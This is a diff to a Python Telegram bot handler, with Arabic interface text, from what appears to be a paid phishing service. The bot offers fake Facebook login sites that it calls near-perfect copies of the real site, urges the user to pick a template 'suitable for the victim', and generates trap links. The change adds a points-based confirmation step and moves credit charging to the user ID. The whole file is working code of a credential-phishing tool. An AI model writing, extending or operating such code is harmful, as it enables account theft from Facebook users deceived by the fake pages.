@@ -1,4 +1,8 @@
 # bot_handlers/callbacks/facebook.py
+# ============================================================
+# روابط مصيدة فيسبوك — مع تأكيد الأدوات
+# ============================================================
+
 import json
 
 from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
@@ -8,7 +12,7 @@ from imports_manager import can_use_tool, consume_usage
 from logging_config import get_logger
 
 from ..helpers import safe_edit, deny_message, h
-from ..keyboards import build_facebook_sites_panel
+from ..keyboards import build_facebook_sites_panel, main_menu
 from ..templates import FACEBOOK_SITES
 from ..sessions import create_fb_session
 
@@ -16,28 +20,32 @@ logger = get_logger("bot_handlers.callbacks.facebook")
 
 
 def handle(call, chat_id, user_id, data):
+
+    # ═══════════════════════════════════════════════════
+    # 🎯 طلب فتح قسم الفيسبوك → عرض تأكيد
+    # ═══════════════════════════════════════════════════
     if data == "gen_fb":
-        check = can_use_tool(chat_id, "fb")
-        if not check["allowed"]:
-            bot.answer_callback_query(call.id, "❌ لا يوجد رصيد", show_alert=True)
-            from ..keyboards import main_menu
-            safe_edit(
-                call,
-                deny_message(check["reason"], chat_id, "fb", check),
-                reply_markup=main_menu(user_id)
+        bot.answer_callback_query(call.id)
+
+        try:
+            from points_system import (
+                build_tool_confirm_text,
+                build_tool_confirm_keyboard,
             )
+            text, can_proceed = build_tool_confirm_text(user_id, "fb_site")
+            m = build_tool_confirm_keyboard("fb_site", can_proceed)
+            safe_edit(call, text, reply_markup=m)
+            return
+        except Exception as e:
+            logger.exception(f"tool_confirm fb error: {e}")
+            _show_fb_panel(call, chat_id, user_id)
             return
 
-        bot.answer_callback_query(call.id)
-        safe_edit(
-            call,
-            "📘 <b>مواقع فيسبوك المزيفة</b>\n"
-            "━━━━━━━━━━━━━━━━━━\n\n"
-            "🎯 <b>10 قوالب احترافية</b>\n"
-            "كل قالب = موقع حقيقي بنسبة 95%\n\n"
-            "💡 <i>اختر القالب المناسب للضحية</i>",
-            reply_markup=build_facebook_sites_panel()
-        )
+    # ═══════════════════════════════════════════════════
+    # بعد التأكيد → تفتح اللوحة
+    # ═══════════════════════════════════════════════════
+    if data == "fb_show_panel":
+        _show_fb_panel(call, chat_id, user_id)
         return
 
     if data.startswith("fb_site_"):
@@ -49,6 +57,20 @@ def handle(call, chat_id, user_id, data):
         return
 
 
+def _show_fb_panel(call, chat_id, user_id):
+    """يعرض لوحة القوالب"""
+    bot.answer_callback_query(call.id)
+    safe_edit(
+        call,
+        "📘 <b>مواقع فيسبوك المزيفة</b>\n"
+        "━━━━━━━━━━━━━━━━━━\n\n"
+        "🎯 <b>10 قوالب احترافية</b>\n"
+        "كل قالب = موقع حقيقي بنسبة 95%\n\n"
+        "💡 <i>اختر القالب المناسب للضحية</i>",
+        reply_markup=build_facebook_sites_panel()
+    )
+
+
 def _handle_site(call, chat_id, user_id, data):
     template_key = data.replace("fb_site_", "")
     tpl = FACEBOOK_SITES.get(template_key)
@@ -56,13 +78,13 @@ def _handle_site(call, chat_id, user_id, data):
         bot.answer_callback_query(call.id, "❌ القالب غير موجود", show_alert=True)
         return
 
-    check = can_use_tool(chat_id, "fb")
+    check = can_use_tool(user_id, "fb_site")
     if not check["allowed"]:
-        bot.answer_callback_query(call.id, "❌ لا يوجد رصيد", show_alert=True)
+        bot.answer_callback_query(call.id, "❌ رصيدك غير كافي", show_alert=True)
         return
 
     bot.answer_callback_query(call.id, "🔄 جاري توليد الرابط...")
-    consume_usage(chat_id, "fb")
+    consume_usage(user_id, "fb_site")
 
     session_id = create_fb_session(chat_id, template_key)
     if not session_id:
@@ -100,7 +122,7 @@ def _handle_site(call, chat_id, user_id, data):
         InlineKeyboardButton("🔄 توليد جديد", callback_data=f"fb_site_{template_key}"),
         InlineKeyboardButton("📊 الإحصائيات", callback_data=f"fb_stats_{template_key}"),
     )
-    m.add(InlineKeyboardButton("🔙 رجوع للقوالب", callback_data="gen_fb"))
+    m.add(InlineKeyboardButton("🔙 رجوع للقوالب", callback_data="fb_show_panel"))
 
     safe_edit(call, text, reply_markup=m)
     logger.info(f"FB Fake Link generated: {template_key}")
